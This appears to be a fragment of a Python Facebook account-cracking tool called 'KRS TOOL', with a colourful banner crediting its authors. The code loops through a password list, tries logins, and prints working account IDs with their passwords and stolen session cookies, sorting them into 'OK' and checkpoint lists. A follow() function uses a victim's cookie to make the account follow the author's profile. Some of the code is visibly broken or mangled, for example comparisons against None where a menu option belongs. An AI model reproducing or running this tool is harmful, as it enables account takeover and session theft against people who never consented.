...
def o():
    ...
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100060747015596')
        return None
    if None == '3':
        os.system('xdg-open https://youtube.com/channel/UCG8CS')
        return None
    if None == '4':
...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100060747015596', {
...
\033[1;35m       ##     ## ##    ##          ##     ## ##     ## ##     ## ##
\033[1;35m       ##     ## ##     ##         ##     ## ########   #######  ######## 
\033[1;32m       FUCK Krs sc"  
 
\033[1;37m================= \33[32;45mSIAM\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mOLIDUR\33[0;m\033[1;32m && \033[1;33mKASHIF\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m OLIDUR RAHMAN
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mTEAM-FUCky
...
\033[1;37m================= \33[32;45mOLIDUR\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO KRS TOOL\33[0;m
 
\033[1;37m================== \33[32;45mJesi\33[0;m ======================\n""")
loop = 0
oks = []
cps = []
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(OLIDUR-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(OLIDUR-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r   mTEmKUR] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
